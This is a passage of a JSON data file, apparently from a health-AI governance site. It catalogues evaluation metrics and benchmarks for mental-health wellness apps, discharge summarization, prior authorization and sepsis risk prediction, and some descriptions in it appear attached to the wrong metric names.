ef lines\").","intended_use":"Use as a safety-filtering and benchmark approach for detecting crisis or severe-distress content in user messages submitted to adult genAI wellness applications. Apply the filter to route high-risk interactions toward crisis resources, human review, or other escalation pathways rather than allowing autonomous wellness-app responses. Treat it as a guardrail requiring human-in-the-loop oversight and validation on real-world consumer wellness interactions before deployment."},{"name":"Responsible Evaluation of AI for Mental Health (interdisciplinary evaluation taxonomy)","cat":"Usefulness, usability & efficacy","principle":"Cross-Cutting","benchmark":"Not a scoring system. Use the taxonomy as a coverage benchmark: assessment tools should show convergent and discriminant validity; intervention tools should show benefit, safety, and acceptability; information-synthesis tools should show workflow or decision-quality improvements. Use it to check whether evaluation evidence is complete enough for the use case.","description":"Conceptual taxonomy that organizes evaluation of AI mental health tools along two intersecting axes. The first axis distinguishes three tool types based on clinical goal: assessment-oriented (e.g., language-based screening, depression detection, suicide risk classification), intervention-oriented (e.g., therapeutic chatbots, prevention nudges, adaptive therapy recommendations), and information synthesis-oriented (e.g., clinical summarization, triage notes, treatment recommendations for clinicians). The second axis specifies four evaluation pillars drawn from classical psychometrics and implementation science: validity (does the tool do what it is intended to do, including convergent, discriminant, and criterion validity), reliability (does it perform consistently across time, populations, and components), implementation (does it fit real-world workflows, demonstrate feasibility, and achieve acceptability), and maintenance (does it remain effective and equitable as users, populations, and language norms evolve, including monitoring for unintended consequences). The framework explicitly maps each tool type to dimension-specific evaluation questions.","intended_use":"Use as conceptual scaffolding for matching evaluation depth to the intended function, risk level, and maturity of an adult genAI wellness application. Apply its validity, reliability, implementation, and maintenance dimensions to distinguish early technical testing from human-centered validation and post-deployment monitoring. For this work group, use the taxonomy to calibrate what claims wellness-app evidence can support and where stronger clinical evidence would be required."},{"name":"CRADLE Bench","cat":"Safety & reliability","principle":"Safety (crisis detection); cross-cutting for evaluation","benchmark":"600 clinician-annotated eval + 420 dev + ~4K ensemble-labeled training examples; seven clinically defined crisis types; first to include temporal labels; six fine-tuned detectors under consensus/unanimous agreement. (Per-type detection metrics are reported in the paper tables — pull specific F1/sensitivity figures from the paper before citing; prioritize crisis sensitivity when setting thresholds.)","description":"A benchmark for multi-faceted mental health crisis detection in text-based model interactions. Unlike prior efforts that cover a narrow set of crisis types, CRADLE Bench defines seven crisis types in line with clinical standards (e.g., suicidal ideation, rape/sexual assault, domestic violence, child abuse, sexual harassment) and is the first crisis-detection benchmark to incorporate temporal labels (distinguishing, e.g., current vs. past events). It provides 600 clinician-annotated evaluation examples and 420 development examples, plus a training corpus of ~4,000 examples auto-labeled by a majority-vote ensemble of multiple LLMs (shown to outperform single-model annotation). The authors also fine-tune six crisis-detection models on subsets defined by consensus vs. unanimous ensemble agreement, offering complementary models trained under different agreement criteria.","intended_use":"Use as a benchmark to evaluate and select crisis/severe-distress detection classifiers or guardrails for adult genAI wellness applications, and to route flagged interactions toward crisis resources, human review, or escalation. The temporal labels help distinguish active from historical crises so escalation logic isn't triggered by past-tense disclosures. Treat as an evaluation/development resource requiring human-in-the-loop validation on real consumer wellness data before deployment."},{"name":"Counsel Bench","cat":"Usefulness, usability & efficacy","principle":"Usefulness, Safety, Transparency","benchmark":"100 real questions × 20 topics; 2,000 expert evaluations (5 raters each; Krippendorff's α 0.72–0.83); 120 adversarial questions; six evaluation dimensions; symptom-speculation failure triggered in ~67–87% of model responses; LLM-as-judge shown to inflate scores and rarely flag flagged spans. Recommend human expert evaluation for safety-critical dimensions.","description":"A large, expert-grounded benchmark for evaluating LLMs in realistic single-turn mental health counseling, built with 100 licensed/trained mental health professionals. It has two parts. CounselBench-Eval: 2,000 expert evaluations of responses to 100 real CounselChat questions (spanning 20 topics such as depression, anxiety, trauma, substance abuse, eating disorders), comparing GPT-4, LLaMA-3.3, Gemini-1.5-Pro, and an online human therapist across six dimensions — overall quality, empathy, specificity, factual consistency, medical advice, and toxicity — with written rationales and span-level annotations (each item rated by five professionals; Krippendorff's α 0.72–0.83). CounselBench-ADV: 120 clinician-authored adversarial questions targeting six concrete failure modes (recommending specific medication, suggesting specific therapy techniques, speculating about symptoms, judgmental tone, apathy, and unsupported assumptions). Key findings: LLM responses were often rated higher than up-voted online-therapist responses, yet showed safety issues (unauthorized medical advice; symptom speculation triggered in ~67–87% of model outputs), and LLM-as-judge evaluators over-rated responses and rarely flagged toxic or incorrect content — a caution against automated self-evaluation in this domain.","intended_use":"Use to evaluate the quality and safety of single-turn, counseling-style responses from wellness LLMs, and to red-team for specific, clinically defined failure modes via CounselBench-ADV. Use the finding that LLM judges miss safety failures as a reason to keep human experts in safety evaluation rather than relying on automated grading. Scoped to single-turn interactions; not a multi-turn or crisis-detection tool."},{"name":"EPITOME Framework","cat":"Usefulness, usability & efficacy","principle":"Usefulness (empathy/quality of support); Transparency (rationale extraction)","benchmark":"Three empathy mechanisms (emotional reactions, interpretations, explorations), each with communication levels; 10k rationale-annotated (post, response) pairs; multi-task RoBERTa bi-encoder for empathy identification + rationale extraction; large-scale application to 235k interactions. See F1 Scores in paper.","description":"A theoretically grounded framework for characterizing how empathy is communicated in text-based mental health support, organized around three mechanisms — Emotional Reactions, Interpretations, and Explorations — each rated at levels of communication (no / weak / strong). It is released with a corpus of 10,000 (post, response) pairs annotated for these mechanisms with supporting rationale spans, and a multi-task RoBERTa-based bi-encoder model that both identifies the empathy level and extracts the underlying rationale text. Applied to 235,000 real interactions, the analysis found that users do not self-learn empathy over time — motivating explicit empathy training and feedback.","intended_use":"Use as a framework and model to measure and give feedback on the empathy of text-based responses — e.g., assessing whether a wellness application's (or a peer supporter's) replies communicate emotional reactions, interpretations, and explorations, and surfacing the specific text that conveys empathy. Suited to response-quality evaluation and empathy-training/feedback loops. It is an empathy-measurement framework, not a crisis or safety filter, and should be paired with dedicated safety/crisis tooling."},{"name":"Human Agency Preservation and Dependency-Risk Evaluation","cat":"Usefulness, usability & efficacy","principle":"Cross-Cutting","description":"Multi-turn behavioral evaluation of whether a genAI-enabled wellness application preserves user agency and avoids reinforcing unhealthy dependency across a sustained interaction rather than within a single response. Scenarios span direct decision requests, repeated reassurance seeking,anthropomorphic or exclusive attachment, withdrawal from human relationships, compulsive-use signals, professional-care substitution, and ordinary low-risk reflection. Human reviewers score observable system behavior across seven dimensions: AI identity and scope, epistemic humility, choice preservation, dependency non-reinforcement, reassurance-loop handling, safety escalation, and proportionality. The method is intended to translate agency, autonomy, over-reliance, and dependency concerns — currently distributed across broad frameworks, interface-usability discussion, expert-safety rubrics, and the APA advisory into a dedicated, behaviorally anchored evaluation with reportable dimensions.","intended_use":"Use for conversational wellness systems where harm may accumulate across turns even when each individual response is polite, factually plausible, and non-crisis. Risk of this kind can build when a system repeatedly supplies certainty, makes personal decisions on the user's behalf, rewards exclusivity, amplifies anthropomorphism, displaces human relationships, or functions as a substitute for professional care. Developers may use the method to distinguish healthy reflective support from judgment substitution and to generate release and monitoring evidence; implementers may use it to compare products without assuming that engagement, satisfaction, empathy, or self-disclosure alone demonstrates safe preservation of human agency. This is a candidate method and should be validated before being adopted as a scored instrument."}]},"patient-discharge-summarization":{"label":"Discharge summarization","url":"https://rai-content.chai.org/en/latest/patient-discharge-summarization/te.html","metrics":[{"name":"DocLens","cat":"Usefulness, usability & efficacy","intended_use":"Assesses coverage of known assertions, or facts, represented in human expert \"ground truth\" summaries. (1) Extract important facts from ground-truth summaries, either manually or using the LLM-as-a-judge approach (2) extract important facts from AI-generated summaries, either manually or using the LLM-as-a-judge approach (3) calculate accuracy, sensitivity, specificity, PPV, NPV of AI-extracted facts as compared to ground-truth facts."},{"name":"ROUGE (Recall-Oriented Understudy for Gisting Evaluation)","cat":"Usefulness, usability & efficacy","intended_use":"N-gram or Longest Common Subsequence overlap can be measured when reference summary is available."},{"name":"BERTScore","cat":"Usefulness, usability & efficacy","intended_use":"BertScore computes similarity scores by aligning generated and reference summaries on a token-level. Token alignments are computed greedily to maximize the cosine similarity between contextualized token embeddings from BERT. Precision, recall, and F1 measure using BERT-based text embeddings"},{"name":"MoverScore","cat":"Usefulness, usability & efficacy","intended_use":"MoverScore (Zhao et al., 2019) measures the semantic distance between a summary and reference text by making use of the Word Mover's Distance (Kusner et al., 2015) operating over n-gram embeddings pooled from BERT representations."},{"name":"Sentence Mover's Similarity","cat":"Usefulness, usability & efficacy","intended_use":"Sentence Mover's Similarity (SMS) (Clark et al., 2019) extends Word Mover's Distance to view documents as a bag of sentence embeddings as well as a variation which represents documents as both a bag of sentences and a bag of words."},{"name":"SummaQA","cat":"Usefulness, usability & efficacy","intended_use":"SummaQA (Scialom et al., 2019) applies a BERT-based question-answering model to answer cloze-style questions using generated summaries. Questions are generated by masking named entities in source documents associated with evaluated summaries. The metric reports both the F1 overlap score and QA-model confidence."},{"name":"BLANC","cat":"Usefulness, usability & efficacy","intended_use":"BLANC (Vasilyev et al., 2020) is a reference-less metric that measures the performance gains of a pre-trained language model given access to a document summary while carrying out language understanding tasks on the source document's text."},{"name":"SUPERT","cat":"Usefulness, usability & efficacy","intended_use":"SUPERT (Gao et al., 2020) is a reference-less metric, originally designed for multi-document summarization, which measures the semantic similarity of model outputs with pseudo-reference summaries created by extracting salient sentences from the source documents, using soft token alignment techniques."},{"name":"BARTScore","cat":"Usefulness, usability & efficacy","intended_use":"BARTScore is an evaluation metric for assessing the quality of text generated by natural language processing (NLP) models. Unlike traditional metrics that rely on direct comparisons between generated text and reference texts, BARTScore treats evaluation as a text generation task itself. It leverages BART, a pre-trained sequence-to-sequence model, to estimate the likelihood of generating the candidate text from the source or reference text. Higher likelihoods indicate better quality, as the model considers the generated text more probable given the source or reference."},{"name":"ACUEval","cat":"Usefulness, usability & efficacy","intended_use":"Another LLM breaks down document to atomic content units (Liu et al., 2023b, ACUs), facts that can be verified and cannot be broken down further. ACUEVAL first generates these atomic facts from the system summary, and then validates each extracted fact against the source document."},{"name":"Bilingual Evaluation Understudy (BLEU)","cat":"Usefulness, usability & efficacy"},{"name":"METEOR","cat":"Usefulness, usability & efficacy","intended_use":"recommend implementer stratify by actual categories and evaluate PDQI-9."},{"name":"Counterfactual DocLens","cat":"Fairness & equity","intended_use":"recommend developer change out the actual source text. Recommend implementer evaluate DocLens stratified by actual patient category."},{"name":"Counterfactual Sentiment Parity","cat":"Fairness & equity","intended_use":"Measure the sentiment consistency across counterfactually generated pairs of output. Use a pre-trained sentiment classifier :math:`Sm : mathcal{Y} rightarrow [0, 1]`. Defined as the difference in predicted sentiment rates by a sentiment classifier applied to counterfactually generated LLM output pairs. See citation for full equation. This allows for some variation in the sentiment output when the sensitive attributes are altered, as long as the change is not significant. It measures more lenient parity in sentiment behavior across counterfactuals."},{"name":"Expected Maximum Toxicity","cat":"Safety & reliability","intended_use":"This measures the highest likelihood of encountering toxic content in a given model. It reflects the worst-case scenario of experiencing toxicity during interaction. Estimates the maximum predicted toxicity probability among the top m generations. Per original paper, the standard choice of m for this metric is m = 25"},{"name":"Reliability of DocLens","cat":"Safety & reliability","intended_use":"For nondeterministic algorithm, assess accuracy measures (from the T&A accuracy section) over multiple evaluations for the same prompt contemporaneously. Regardless, assess accuracy over time on same metrics."},{"name":"Toxic Fraction","cat":"Safety & reliability","intended_use":"The proportion of outputs from a model that are considered toxic, indicating the prevalence of toxic behavior across all generated output. Toxic Fraction is defined as the fraction of generations that are classified as toxic. This metric effectively estimates the likelihood that responses generated by M on prompts from PX contain toxic text. Note that while the standard choice of m for this metric is m = 1, a larger value of m may be preferred in practice if sampling a large N is infeasible."},{"name":"Toxicity Probability","cat":"Safety & reliability","intended_use":"The probability that any given model output will contain toxic content, providing a general likelihood of encountering toxicity on any interaction. Toxicity Probability is calculated as the empirical probability of having at least one toxic prediction (:math:`T(hat{Y}) geq 0.5`) among the top m generations. Per original paper, the standard choice of m for this metric is m = 25."},{"name":"Holistic Evaluation of Language Models (HELM)","cat":"Safety & reliability","intended_use":"Applies to underlying language model but does not assess the output of the model in DC summary generation. Should request vendor provide data on safety prior to use of model."},{"name":"Medsafetybench","cat":"Safety & reliability","intended_use":"Applies to underlying language model but does not assess the output of the model in DC summary generation. Should request vendor provide data on safety prior to use of model."},{"name":"Calibration","cat":"Safety & reliability","intended_use":"Adequate sequential order of events is captured: \"The text coherently documents the key findings from the conversation in a sequential matter from the patient's symptoms to their allergies and family history and then to the examination and plan\". Overall evaluation could also capture lack of follow up information, management plan. Basically seems like a weighted version of accuracy metrics."},{"name":"Proportion of Uses Disclosed to Patients","cat":"Usefulness, usability & efficacy","intended_use":"Proportion of summaries for which use of the LLM is disclosed to the patient in a deployed system."},{"name":"Availability of AI System Facts","cat":"Usefulness, usability & efficacy","intended_use":"The Transparent Reporting of a Multivariable Model for Individual Prognosis or Diagnosis-Large Language Model (TRIPOD-LLM) guideline may serve as a way to transparently communicate GenAI evaluation methods and results. Multistep checklist assessing underlying data, training process, evaluation"},{"name":"Clinical-Grade Evaluation of Large Language Models","cat":"Usefulness, usability & efficacy","intended_use":"Evaluate presence/absence of reported elements in an evaluation. Checklist primarily intended for reproducibility, but has elements that can be surfaced for transparency, e.g., Model versioning"},{"name":"Model Uptime/Failed Generations when Deployed","cat":"Safety & reliability","intended_use":"Use existing red teaming/attack toolkits to evaluate for privacy leaks."},{"name":"Data Retention and Reuse Policies","cat":"Safety & reliability","intended_use":"Document the threat model used in security/privacy analysis and provide clear justifications for which attacks are in scope vs. out of scope."},{"name":"Minimum Data Access","cat":"Safety & reliability","intended_use":"If commercial, how much data a vendor/model has access to, compared to how much data is needed for task."}]},"prior-authorization-ai-supported-criteria-matching":{"label":"Prior authorization","url":"https://rai-content.chai.org/en/latest/prior-authorization-ai-supported-criteria-matching/t%26e-framework.html","metrics":[{"name":"Reduce Turnaround Time (TAT)","cat":"Usefulness, usability & efficacy","principle":"Usefulness","who":"Implementer","benchmark":"National average TAT for PA decisions is approximately 3-5 business days; Organizations should track % difference in improvement for TAT between non-AI v. AI PA solutions; Align to CMS Final Rule CMS-0057-F (\"decisions within 72 hours for expedited requests and seven calendar days for standard requests\"\"; and relevant state laws (e.g., CA, WA)","description":"Measure efficiency and effectiveness in healthcare delivery by reducing turnaround time (TAT) for prior authorization (PA), benefiting both providers and patients. TAT in this context means from a prior authorization submitted to an initial decision.","intended_use":"Measure if TAT for PA reviews is reduced by automating clinical documentation analysis and aligning documentation with medical necessity criteria. Organizations should consider separately evaluating TAT for auto-approved prior authorizations v. manual reviews of non-auto-approved prior authorizations. This will help reduce conflated average TAT times."},{"name":"Policy Coverage Completeness","cat":"Usefulness, usability & efficacy","principle":"Usefulness","when":"Pre-Implementation","who":"Developer","benchmark":"≥ 90% of required, non-judgment policy coverage criteria accurately represented in benchmark datasets; ≤ 10% of objective policy coverage criteria (e.g., contraindications, lab thresholds) missing or mis-mapped.","description":"Evaluate whether the AI solution captures non-judgment policy coverage criteria (i.e., data fields in a payer policy such as inclusion/exclusion rules, eligibility thresholds, contraindications) and flags any gaps or omissions in coverage.","intended_use":"Validate that AI outputs map directly to each policy coverage criteria and confirm alignment with clinician judgment on whether policy coverage criteria are fully met in practice."},{"name":"Time-on-Task","cat":"Usefulness, usability & efficacy","principle":"Usability","when":"Pre-Implementation","who":"Implementer","benchmark":"≥ ~15-30% reduction in time compared to baseline manual process is considered meaningful in utilization management operations","description":"Measure how long it takes users to complete PA criteria-matching tasks (e.g., verifying documentation against payer rules) when supported by the AI solution.","intended_use":"Assess efficiency gains by comparing AI-assisted task completion times against manual review, with focus on reducing provider administrative workload"},{"name":"Out-of-Task Question Handling","cat":"Usefulness, usability & efficacy","principle":"Efficacy","who":"Developer","benchmark":"≥ 95% correct rejection or redirection of out-of-scope queries in controlled testing scenarios","description":"Validate whether the AI solution properly rejects, redirects, or flags prompts or queries that fall outside the scope of the trained PA criteria matching task.","intended_use":"Prevent erroneous or misleading outputs by confirming that the AI solution does not attempt to answer prompts beyond its intended use (e.g., making clinical judgments outside coverage criteria alignment)."},{"name":"Change in Performance due to Policy Updates","cat":"Usefulness, usability & efficacy","principle":"Efficacy","when":"Post-Implementation","who":"Developer","benchmark":"No single benchmark; Developers should track any decline in key performance metrics post-policy update","description":"Evaluate how AI solution performance (e.g., precision, recall, F1 score) changes after implementation of new or revised prior authorization policies or coverage policies. This method quantifies the solution's adaptability and continued clinical alignment over time.","intended_use":"Ensure the AI-supported criteria matching system remains accurate and clinically relevant following frequent payer or policy updates by comparing pre- and post-policy performance on aligned test cases."},{"name":"Appeal Overturn Rate","cat":"Usefulness, usability & efficacy","principle":"Efficacy","when":"Pre- and Post-Implementation","who":"Implementer","benchmark":"The goal is to keep the Appeal Overturn Rate from rising above historical baselines during early adoption and to reduce it below pre-AI levels over time, showing that the AI solution decreases inappropriate denials and appeals.","description":"The change, pre- vs. post-implementation of the AI-supported prior authorization solution, in the proportion of claims where payment was made only after a successful patient or provider appeal. This metric captures whether AI recommendations are leading to a higher rate of denials that are later overturned, indicating potential harm to patients or added administrative burden for providers. Note: an appeal is sometimes overturned because certain information either wasn't given or incomplete - this metric focuses exclusively on the AI components of the appeal evaluation.","intended_use":"Track changes in the proportion of claims paid only after a successful appeal following deployment of the AI-supported PA solution. Compare post-implementation Appeal Overturn Rate to historical baselines and stratify by clinical area or patient subgroup to identify unintended increases in inappropriate denials. Note: there is a risk of automation bias using this method to track."},{"name":"Predictive Parity (Positive Predictive Value Parity)","cat":"Fairness & equity","principle":"Fairness","benchmark":"If subgroup PPV difference > 0.05, trigger review of training data composition, criteria mapping, or thresholding.","description":"An AI solution satisfies predictive parity when the Positive Predictive Value (PPV) --- the proportion of positive predictions that are correct --- is equivalent across protected and unprotected groups. In the context of AI-supported prior authorization (PA), this means that when the model predicts that a service or request meets medical necessity criteria, the rate of correct predictions (validated by human reviewers or ground truth labels) is consistent across demographic subgroups (e.g., by race/ethnicity, sex, age, language, disability status).","intended_use":"Test whether prediction accuracy and error rates differ systematically across protected classes, isolating predictor-level bias from potential downstream user or process bias. Validate that the AI solution's criteria-matching predictions are equally reliable for all subgroups, reducing risk of inequitable outcomes in manual review or appeal."},{"name":"Toxicity Language Score","cat":"Fairness & equity","principle":"Bias Management","who":"Developer","benchmark":"Suggest a toxicity score < 0.1 (or 10%) generally indicates a low likelihood of the output being perceived as toxic, offensive, or biased by the average user; the goal is to have 0 toxic language.","description":"Applies natural language processing (NLP) models to flag presence of potentially harmful or biased language in generative model outputs. For example, there are automated guardrails that remove/filter toxicity from language model outputs, such as AWS Bedrock or Anthropic's Responsible Scaling Policy.","intended_use":"Evaluate the presence of harmful, offensive, or biased language in AI-generated text outputs, such as rationale summaries explaining approval decisions. In a prior authorization setting, ensuring that generated content is free of toxic language is critical because patients, providers, and payers may review these summaries. While violent or sexual content may often be flagged as toxic, such language can in some cases serve a legitimate and clinically appropriate purpose (e.g., in describing medical conditions or scenarios). Therefore, toxicity detection mechanisms should be calibrated to distinguish between harmful language and contextually necessary terminology, rather than categorically suppressing all flagged content. * The objective is to extend existing toxicity measurement frameworks to this use case by capturing subtler forms of potentially harmful language. While overtly toxic content (e.g., hate or sexual speech) is unlikely in prior authorization decisions, language perceived as condescending, dismissive, or minimizing patient suffering may occur. The toxicity measurement should therefore account for such nuanced expressions within the Toxicity Language Score."},{"name":"Auto-Approval vs. Manual Review Outcome Disparity","cat":"Fairness & equity","principle":"Bias Management","description":"Compare health and access outcomes for patients whose prior auth requests were auto-approved versus those that required manual review. Stratify by demographic and clinical subpopulations to detect disparities that may not be visible in overall metrics. This approach addresses the \"Symptoms Paradox,\" where seemingly appropriate use of manual review in high-risk or ambiguous cases can unintentionally concentrate delays or burdens on vulnerable subgroups.","intended_use":"Identify subpopulations that experience differential access, approval, or clinical outcomes based on how their requests are routed (auto vs. manual). Surface cases where routing logic may exacerbate disparities or clinical risks. Support refinement of triage thresholds or review escalation rules. Note: \"identify subpopulations\" should be done within clinical conditions to avoid confounding by condition."},{"name":"Demographic Appeal Delay Difference","cat":"Fairness & equity","principle":"Bias Management","when":"Pre-Implementation for Developers; Post-Implementation for Implementers","benchmark":"No recommended benchmark","description":"Evaluate claims based on expected time to approval, or on appeal, by demographic group within clinical categories of care. A process may have parity in percentage approved, but that process may auto-approve without appeal at a rate different than another demographic group's claims that experience a higher appeals rate.","intended_use":"Evaluate whether the AI-supported prior authorization process produces equitable turnaround times and appeal experiences across demographic groups. This metric identifies if certain populations face longer delays or higher reliance on appeals to achieve approval, even when overall approval rates appear similar. It ensures that efficiency gains from automation do not introduce administrative inequities."},{"name":"Failure Analysis","cat":"Safety & reliability","principle":"Safety","when":"Pre-Implementation","benchmark":"Example benchmark includes: Risk Priority Number (RPN) < 100; the RPN scale typically ranges from 1 to 1000 (S, O, D each rated 1--10). A value of 100 (e.g., 5×5×4) indicates a moderate level of risk. Keeping all critical failure modes below 100 ensures that the AI solution does not go live with any unacceptably high-risk scenarios.","description":"Software failure analysis involves identifying the root cause of software failures to improve reliability and prevent future occurrences. Common types of software failure analysis include: Fault Tree Analysis (FTA), Failure Modes and Effects Analysis (FMEA), and Root Cause Analysis. These techniques help analyze potential failure scenarios, their impact, and the underlying reasons for failure.","intended_use":"Identify and mitigate risks in AI-supported criteria matching prior to live deployment. This means systematically evaluating where and how the AI might fail, such as misalignment with payer criteria, and determining how severe these failures would be if they occurred in real-world use. As an example in this context, FMEA is adapted to the AI lifecycle to account for unique risks like data drift, model bias, and hallucinations in generated outputs. Each identified failure mode is scored based on Severity (S), Occurrence (O), and Detection (D), producing a Risk Priority Number (RPN = S×O×D). * Example scenario: in an AI-enabled prior authorization system, model performance can rapidly degrade when payer medical policies change, rendering historical approval/denial patterns obsolete. Failure Analysis (FMEA) helps identify this as a high-severity failure mode, assess its likelihood, and implement mitigations such as automated policy-change alerts, shadow model testing, and timely retraining. This ensures the AI remains aligned with current payer rules, avoiding non-compliant decisions and care delays."},{"name":"Uptime Ratio / System Reliability","cat":"Safety & reliability","principle":"Reliability","benchmark":"Vendor organizations should strive for system uptime ≥ 99.9%","description":"Quantifies system reliability by measuring the proportion of time AI services are available and functional.","intended_use":"Ensure AI-based criteria matching services are consistently operational within clinical workflows. An example is Google's Cloud Healthcare Service Level Agreement (SLA)"}]},"sepsis-risk-prediction":{"label":"Sepsis risk prediction","url":"https://rai-content.chai.org/en/latest/sepsis-risk-prediction/te.html","metrics":[{"name":"Sequential Organ Failure Assessment (SOFA) score","cat":"Usefulness, usability & efficacy","intended_use":"numerically quantifies the number and severity of failed organs."},{"name":"Risk Ratio","cat":"Usefulness, usability & efficacy","intended_use":"metric computes the area under the curve (AUC) for the Receiver Operating Characteristic Curve (ROC). The return values represent how well the model used is predicting the correct classes, based on the input data. A score of 0.5 means that the model is predicting exactly at chance"},{"name":"Area under the curve (AUC)—precision recall curve (PRC) (AUC-PRC)","cat":"Usefulness, usability & efficacy","intended_use":"model performance metric for binary responses that is appropriate for rare events and not dependent on model specificity"},{"name":"Precision (or Positive Predictive Value, PPV)","cat":"Usefulness, usability & efficacy","intended_use":"the fraction of correctly labeled positive examples out of all of the examples that were labeled as positive. It is computed via the equation: Precision = TP / (TP + FP) where TP is the True positives (i.e. the examples correctly labeled as positive) and FP is the False positive examples (i.e. the examples incorrectly labeled as positive). Retrospective cohort studies: recommended PPV at Sensitivity = 0.9"},{"name":"Recall (or Sensitivity)","cat":"Usefulness, usability & efficacy","intended_use":"Recall is the fraction of the positive examples that were correctly labeled by the model as positive. It can be computed with the equation: Recall = TP / (TP + FN) Where TP is the number of true positives and FN is the number of false negatives. Retrospective cohort studies: Recommended PPV at Sensitivity = 0.9"},{"name":"Specificity","cat":"Usefulness, usability & efficacy","intended_use":"measure performance in external validation cohort; measure performance on different floors / inpatient services. Recommended PPV at Sensitivity = 0.9"},{"name":"F1 score","cat":"Usefulness, usability & efficacy","intended_use":"calculated from the precision and recall of the test, where the precision is the number of true positive results divided by the number of all positive results, including those not identified correctly, and the recall is the number of true positive results divided by the number of all samples that should have been identified as positive."},{"name":"Root Mean Squared Error (RMSE)","cat":"Usefulness, usability & efficacy","intended_use":"measure of the differences between values (sample or population values) predicted by a model or an estimator and the values observed. The RMSE represents the square root of the second sample moment of the differences between predicted values and observed values or the quadratic mean of these differences."},{"name":"Coefficient of Determination (R-squared)","cat":"Usefulness, usability & efficacy","intended_use":"the proportion of the variance in the dependent variable that is predictable from the independent variables."},{"name":"Time-to-Event","cat":"Usefulness, usability & efficacy","intended_use":"Assessment of the time between prediction and event/outcome. For example, the average number of hours between an alert and administration of antibiotics."},{"name":"Inclusion / Exclusion Analysis","cat":"Usefulness, usability & efficacy","intended_use":"Assessment of model performance after applying conditions of use. For example, measuring performance characteristics following exclusion of patients on antibiotics, patients with invasive surgery in the last 24 hours, bone marrow transplant patients, etc."},{"name":"Ground Theory Analysis","cat":"Usefulness, usability & efficacy","intended_use":"Use this qualitative research method to develop theories based on systematically gathered and analyzed data. Conduct semi-structured interviews with clinicians or relevant end-users to gather insights. Focus on themes such as how clinicians perceive the AI system’s accuracy and trustworthiness and how well the AI system fits into existing clinical workflows. Use iterative coding and constant comparison to analyze interview data. Generate theories that are grounded in the actual experiences and needs of end-users."},{"name":"HOUsing-based SocioEconomic Status measure (HOUSES) Index","cat":"Usefulness, usability & efficacy","intended_use":"compare balanced error rate (BER) against different socioeconomic status (SES) levels"},{"name":"Differential Missingness","cat":"Usefulness, usability & efficacy","intended_use":"probability of data being missing varies across different groups or conditions within a study. This can lead to biased estimates and affect the validity of the study's conclusions."},{"name":"Equality of Opportunity Difference (EOD)","cat":"Usefulness, usability & efficacy","intended_use":"measures the deviation from the equality of opportunity, which means that the same proportion of each population receives the favorable outcome. This measure must be equal to 0 to be fair."},{"name":"Confusion Matrix","cat":"Usefulness, usability & efficacy"},{"name":"Equalized Odds","cat":"Usefulness, usability & efficacy","intended_use":"prediction errors are distributed equally across different groups"},{"name":"Slice Finding","cat":"Usefulness, usability & efficacy","intended_use":"Automatically identify subgroups in the data where the model is underperforming (e.g. based on demographics, comorbidities, etc.)"},{"name":"Accuracy","cat":"Safety & reliability","intended_use":"Evaluate the correctness of the AI model's predictions (e.g., percentage of correct predictions). Accuracy = (TP + TN) / (TP + TN + FP + FN) , where: TP = True Positive; TN = True Negative; FP = False Positive; FN = False Negative."},{"name":"Risk Framework","cat":"Safety & reliability","intended_use":"assess the safety and reliability of predictive AI algorithms using a risk framework."},{"name":"Task Analysis","cat":"Safety & reliability","intended_use":"Conduct a task analysis, failure modes and effects analysis (FMEA), or detailed walkthroughs to identify potential failure points."},{"name":"Non-Inferiority Assessment","cat":"Safety & reliability","intended_use":"Compare the AI system to clinician experts, particularly in cases where prioritization tools are used, to ensure adequacy."},{"name":"Likelihood of Failure at Identified Failure Points","cat":"Safety & reliability","intended_use":"measure developed and evaluated during pre-implementation."},{"name":"Number of Successful Predictions","cat":"Safety & reliability","intended_use":"quantitative measure of reliability (e.g., number of correct predictions over total cases)."},{"name":"Percentage of Errors","cat":"Safety & reliability","intended_use":"Quantitative measure of errors over a given number of cases."},{"name":"Predetermined Change Control Plan","cat":"Safety & reliability","intended_use":"Identify performance metrics that will be monitored and their corresponding control limits to trigger model updates."},{"name":"Saliency Maps","cat":"Usefulness, usability & efficacy","intended_use":"highlight the important regions of the input data, such as images, that influenced the model's decisions, but also consider the reliability of these maps and the rational for that region of the data being included"},{"name":"Locally Interpretable Model-Agnostic Explanations (LIME)","cat":"Usefulness, usability & efficacy","intended_use":"method developed to enhance the explainability and transparency of machine learning models, particularly those that are complex and difficult to interpret. The core idea of LIME is to approximate the behavior of a complex model with a simpler, more interpretable model in the context of a specific prediction."},{"name":"Shapley Additive Explanation (SHAP)","cat":"Usefulness, usability & efficacy","intended_use":"method that quantifies the contribution of each feature to the output of a predictive model. Rooted in cooperative game theory, SHAP values provide a theoretically sound approach for interpreting complex models by distributing the prediction difference fairly among the input features."},{"name":"Prototypical Explanations","cat":"Usefulness, usability & efficacy","intended_use":"identify which parts of the model are contributing to the model's decisions. This approach relies on human experts to identify prototypes for the explanation to use as a comparison, which can be a limitation of the approach"},{"name":"Availability of AI System Facts","cat":"Usefulness, usability & efficacy","intended_use":"Automated alert followed by manual screening allows for additional transparency relative to completely automated solutions."},{"name":"Locality of the assessment","cat":"Safety & reliability","intended_use":"observe and characterize the stakeholders receiving information on patient."},{"name":"Consult security experts","cat":"Safety & reliability","intended_use":"this may include folks such as Data Protection Officer in the planning phase to develop a data governance strategy."},{"name":"Leverage industry security guidelines","cat":"Safety & reliability","intended_use":"use security guidelines (e.g., NIST, ISO/IEC, OECD) and refine them with nuanced expert judgment."},{"name":"Data Protection Impact Assessments (DPIA)","cat":"Safety & reliability","intended_use":"conducting Data Protection Impact Assessments (DPIA) during the design phase."},{"name":"Threat Modeling","cat":"Safety & reliability","intended_use":"anticipate and prepare for potential breaches, including attacker incentives and impact evaluations."},{"name":"Evaluation of the likelihood and impact of various attack vectors","cat":"Safety & reliability"},{"name":"Data Provenance Tracking","cat":"Safety & reliability","intended_use":"ensure data integrity."},{"name":"Numeric results from risk assessments","cat":"Safety & reliability"},{"name":"Outcomes of privacy preservation evaluations","cat":"Safety & reliability"},{"name":"System Usability Scale (SUS)","cat":"Usefulness, usability & efficacy","intended_use":"this metric refers to the possibility that an AI model or system performs differently based on the socioeconomic background of the users or subjects. It evaluates whether individuals from different SES levels (e.g., income, education, occupation) experience varying levels of accuracy, error rates, or outcomes from the system, potentially highlighting biases or inequities in how the system treats different socioeconomic groups"},{"name":"Usability Testing and Heuristic Evaluation","cat":"Usefulness, usability & efficacy","intended_use":"In addition to the intrinsic and extrinsic evaluation conducted in the pre-implementation stages, one must consider the user's interaction with the system. Use usability testing and heuristic evaluation to evaluate the AI system's interface."},{"na /* ============================================================
   CHAI: lifecycle rules
   Phase, review cadence, compliance flags and status. These read
